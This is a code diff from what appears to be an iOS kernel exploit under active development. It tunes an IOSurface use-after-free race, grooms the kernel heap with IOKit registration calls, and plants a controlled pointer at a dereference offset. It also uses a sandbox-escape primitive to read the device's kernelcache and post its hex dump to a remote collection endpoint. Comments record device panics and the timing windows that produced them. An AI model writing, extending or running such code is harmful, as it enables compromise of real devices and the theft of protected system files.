@@ -817,71 +817,56 @@ static int64_t sbxRead(const char *path) {
 
 static void stageKCE(void) {
     EV("[uaf][KCE] === stage KCE: kernelcache evidence via the sandbox escape ===");
-    int64_t h = sbxRead("/System/Library/Caches");
-    EV("[uaf][KCE] escape handle for /System/Library/Caches -> %lld", (long long)h);
-    // the escape grants the PATH, not its subtree (the 21.11 device run:
-    // opendir com.apple.kernelcaches -> EPERM even with the Caches handle), so
-    // take a handle for the subdirectory the kernelcache actually lives in
-    int64_t h2 = sbxRead("/System/Library/Caches/com.apple.kernelcaches");
-    EV("[uaf][KCE] escape handle for com.apple.kernelcaches -> %lld", (long long)h2);
-    if (h <= 0 && h2 <= 0) { EV("[uaf][KCE] escape failed (root-owned dir, or path moved on 26.2)"); return; }
-    const char *dirs[] = { "/System/Library/Caches/com.apple.kernelcaches",
-                           "/System/Library/Caches", NULL };
-    for (int di = 0; dirs[di]; di++) {
-        DIR *d = opendir(dirs[di]);
-        if (!d) { EV("[uaf][KCE] opendir %s -> %s", dirs[di], strerror(errno)); continue; }
-        struct dirent *de;
-        char found[256] = {0};
-        while ((de = readdir(d))) {
-            if (de->d_name[0] == '.') continue;
-            EV("[uaf][KCE] entry: %s/%s", dirs[di], de->d_name);
-            // iOS 26 ships a FILESET kernelcache (uncompressed Mach-O - see the
-            // panic's "Fileset Kernelcache UUID"), so the filename is dynamic:
-            // kernelcache.<board-config> - take the first kernelcache* hit.
-            if (!found[0] && strncmp(de->d_name, "kernelcache", 12) == 0)
-                snprintf(found, sizeof found, "%s", de->d_name);
-        }
-        closedir(d);
-        if (!found[0]) continue;
-        char kc[512];
-        snprintf(kc, sizeof kc, "%s/%s", dirs[di], found);
+    // opendir of com.apple.kernelcaches stayed EPERM even with its own handle
+    // (the extension behaves file-scoped), and the panic on 21.11 named the
+    // device as iPhone13,1 - so go straight for the fileset kernelcache by
+    // candidate filename, each with its OWN escape handle (file-scoped grants).
+    const char *cands[] = {
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13,1",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13,1",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d23ap",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d52p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache",
+        "/System/Library/Caches/kernelcache.release.iphone13,1",
+        NULL };
+    for (int ci = 0; cands[ci]; ci++) {
+        int64_t h = sbxRead(cands[ci]);
+        if (h <= 0) { EV("[uaf][KCE] handle %s -> %lld", cands[ci], (long long)h); continue; }
         struct stat st;
-        if (stat(kc, &st) == 0) {
-            EV("[uaf][KCE] kernelcache %s size=%lld", kc, (long long)st.st_size);
-            FILE *f = fopen(kc, "rb");
-            if (f) {
-                // dump 4 MB: on 26.2 the image is a raw fileset Mach-O, so the
-                // head carries the header + load commands + the start of __TEXT
-                size_t want = 4u << 20;
-                uint8_t *buf = malloc(want);
-                if (buf) {
-                    size_t n = fread(buf, 1, want, f);
-                    EV("[uaf][KCE] dumping first %zu of %lld bytes", n, (long long)st.st_size);
-                    for (size_t o = 0; o + 16 <= n && o < 2048; o += 16) {
-                        char line[128]; size_t off = 0;
-                        for (int k = 0; k < 16; k++)
-                            off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
-                        EV("[uaf][KCE]   +%#zx %s", o, line);
-                    }
-                    evLine("=== kernelcache dump begin ===");
-                    // POST the head in 2 KB lines (the kce_parse.py archive)
-                    for (size_t o = 0; o + 2048 <= n; o += 2048) {
-                        char chunk[4200]; size_t co = 0;
-                        co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
-                        for (size_t k = 0; k < 2048; k++)
-                            co += (size_t)snprintf(chunk + co, sizeof chunk - co,
-                                                   "%02x", buf[o + k]);
-                        AvePost([NSString stringWithUTF8String:chunk]);
-                        usleep(3000);
-                    }
-                    EV("[uaf][KCE] kernelcache head delivered");
-                    free(buf);
-                }
-                fclose(f);
-            }
+        if (stat(cands[ci], &st) != 0) {
+            EV("[uaf][KCE] escape ok but stat %s -> %s", cands[ci], strerror(errno));
+            continue;
         }
-        return;   // the fileset dir is authoritative on 26.2
+        EV("[uaf][KCE] FOUND %s size=%lld", cands[ci], (long long)st.st_size);
+        FILE *f = fopen(cands[ci], "rb");
+        if (!f) { EV("[uaf][KCE] fopen -> %s", strerror(errno)); continue; }
+        size_t want = 4u << 20;
+        uint8_t *buf = malloc(want);
+        if (buf) {
+            size_t n = fread(buf, 1, want, f);
+            EV("[uaf][KCE] dumping first %zu of %lld bytes", n, (long long)st.st_size);
+            for (size_t o = 0; o + 16 <= n && o < 2048; o += 16) {
+                char line[128]; size_t off = 0;
+                for (int k = 0; k < 16; k++)
+                    off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
+                EV("[uaf][KCE]   +%#zx %s", o, line);
+            }
+            evLine("=== kernelcache dump begin ===");
+            for (size_t o = 0; o + 2048 <= n; o += 2048) {
+                char chunk[4200]; size_t co = 0;
+                co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
+                for (size_t k = 0; k < 2048; k++)
+                    co += (size_t)snprintf(chunk + co, sizeof chunk - co, "%02x", buf[o + k]);
+                AvePost([NSString stringWithUTF8String:chunk]);
+                usleep(3000);
+            }
+            EV("[uaf][KCE] kernelcache head delivered (%zu B)", n);
+            free(buf);
+        }
+        fclose(f);
+        return;
     }
+    EV("[uaf][KCE] no kernelcache candidate matched - the name is not in the list");
 }
 
 // ---------------------------------------------------------------------------
@@ -1341,16 +1326,17 @@ static int holdGroom(int n, uint32_t tag) {
     for (int i = 0; i < n && gHoldN < 512; i++) {
         mach_port_t wp = newWakePort();
         if (!wp) break;
-        // UNIQUE id per call: with one id all 64 inserts past the first return
-        // 0xC9 (already registered) - only the first survives (the 21.11 device
-        // run showed hold=1 on round 0 and 0 on every later round)
+        // MEASURED on the 22.11 run: the registry key is in[1], NOT in[0] -
+        // varying only in[0] gave one insert and then 0xC9 (InternalError) on
+        // every call, while in[1]=2 in stage B worked.  So: unique in[1] per
+        // call (the canary id still rides in in[0] and in[2] for the dump).
         uint64_t id = 0xC0FFEE5A00000000ull | (0x24ull << 16) | ((tag * 1024 + (uint32_t)i) & 0xffff);
-        uint64_t in[3] = { id, 0x1122334455667788ull, CANARY_F5 };
+        uint64_t in[3] = { id, 0x5151000000000000ull | (tag * 4096 + (uint32_t)i), CANARY_F5 };
         kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, SEL_REG, wp, &ref, 1,
                                                    NULL, 0, in, 24, NULL, NULL, NULL, NULL);
         if (r != KERN_SUCCESS) {
-            if (bad < 3) EV("[uaf][P2] holdGroom i=%d id=%#llx -> %#x", i,
-                            (unsigned long long)id, (uint32_t)r);
+            if (bad < 3) EV("[uaf][P2] holdGroom i=%d key=%#llx -> %#x", i,
+                            (unsigned long long)in[1], (uint32_t)r);
             bad++;
             dropPort(wp);
             continue;
@@ -1696,7 +1682,7 @@ static void p4_fill(IOSurfaceRef_ s, uint32_t tag, uint64_t target) {
     void *base = IOSurfaceGetBaseAddress(s);
     if (base) {
         uint64_t *q = (uint64_t *)base;
-        size_t nq = 64 / 8;                       // the 64x4x4BPE shape = 1KB
+        size_t nq = 1024 / 8;                     // the 64x4x4BPE shape = 1KB
         for (size_t k = 0; k < nq; k++)
             q[k] = 0xC0FFEE5A00000000ull | (((uint64_t)(0x53) & 0xffff) << 16) | (tag * 256 + (uint32_t)k);
         q[1] = target;                            // +8: the deref offset
@@ -1723,18 +1709,19 @@ static void p4_unit(int round) {
         gSpamConn = c; gSpamShape = 1; gSpamRun = 1; gSpamCount = 0;
         pthread_t th[4];
         for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamReg, NULL);
-        // the churn: create/release surfaces that are NOT ours, while our
-        // mapped canaries stay alive
-        for (int i = 0; i < 24; i++) {
+        // the V_SURFCH rhythm that produced the 21.11 panic, exactly:
+        // 8 churn surfaces with their ids read, a 200..950us window, the
+        // close, then 400us while the spam is still in flight
+        for (int i = 0; i < 8; i++) {
             IOSurfaceRef_ t = mkSurface();
-            if (t) CFRelease(t);
-            usleep(2000);
+            if (t) { if (IOSurfaceGetID) (void)IOSurfaceGetID(t); CFRelease(t); }
         }
+        usleep(200 + (round % 30) * 25);
         IOServiceClose(c);                        // the free window
-        usleep(5000);
+        usleep(400);
         gSpamRun = 0;
         for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
-        EV("[uaf][P4] unit=%d round=%d survived (spam=%llu, target=%#llx)",
+        EV("[uaf][P4] round=%d survived (spam=%llu, target=%#llx)",
            round, (unsigned long long)gSpamCount, (unsigned long long)target);
     }
     for (int i = 0; i < K; i++) if (s[i]) CFRelease(s[i]);
@@ -1743,16 +1730,16 @@ static void p4_unit(int round) {
 }
 
 NSString *ModIsurfUAF3(void) {
-    p2Load();
     if (!g_ev) g_ev = fopen(g_evpath, "a");
+    p2Unit = 0; p2Round = 0;          // phase 4 keeps its own round numbering
     stageKCE();
     AveSetStatus(@"112477 phase 4: surface deref control");
     if (!gSvc && findService() != 0) return @"112477 P4: no IOSurface service";
     int ran = 0;
-    for (int r = 0; r < 8 && ran < 3; r++, p2Round++) {
+    for (int r = 0; r < 12; r++) {
         EV("[uaf][P4] ---- round %d (target sweep %#llx) ----",
-           p2Round, (unsigned long long)P4_TARGETS[p2Round % P4_NT]);
-        p4_unit(p2Round);
+           r, (unsigned long long)P4_TARGETS[r % P4_NT]);
+        p4_unit(r);
         ran++;
     }
     return S(@"112477 P4: %d rounds survived (canary at +8, mappings held live)", ran);
